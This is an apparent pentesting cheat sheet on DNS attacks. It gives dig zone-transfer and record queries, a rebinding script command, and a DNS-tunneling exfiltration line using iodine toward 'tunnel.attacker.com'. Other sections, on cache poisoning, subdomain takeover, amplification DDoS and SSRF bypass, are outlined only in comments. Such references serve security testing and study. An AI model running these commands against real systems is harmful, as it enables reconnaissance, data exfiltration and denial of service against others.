# DNS Attacks

## 1. DNS Enumeration
```bash
# Zone transfer
dig axfr target.com @ns1.target.com
# DNS records
dig ANY target.com
dig A target.com
dig AAAA target.com
dig MX target.com
dig NS target.com
dig TXT target.com
dig SOA target.com
```

## 2. DNS Rebinding
```bash
# Attack DNS resolution
# First resolution: attacker IP (passes validation)
# Second resolution: internal IP
python3 rebinder.py --ip 127.0.0.1 --domain attack.rebind.it
```

## 3. DNS Cache Poisoning
```bash
# Spoof DNS responses
# Intercept DNS queries
# Send forged responses
```

## 4. DNS Tunneling
```bash
# Data exfiltration via DNS
iodine -f tunnel.attacker.com
dnscat2
```

## 5. Subdomain Takeover
```bash
# Check for dangling CNAME
dig CNAME sub.target.com
# If CNAME points to unclaimed service
# Register the service
```

## 6. DNS Amplification
```bash
# Use open resolvers for DDoS
# Send small query, large response to victim
```

## 7. DNS Rebinding to SSRF
```bash
# Bypass SSRF validation
# DNS resolves to internal IP after validation
```

## Tools
```bash
# dig
# nslookup
# dnsenum
# dnsrecon
# fierce
# amass
# subfinder
```
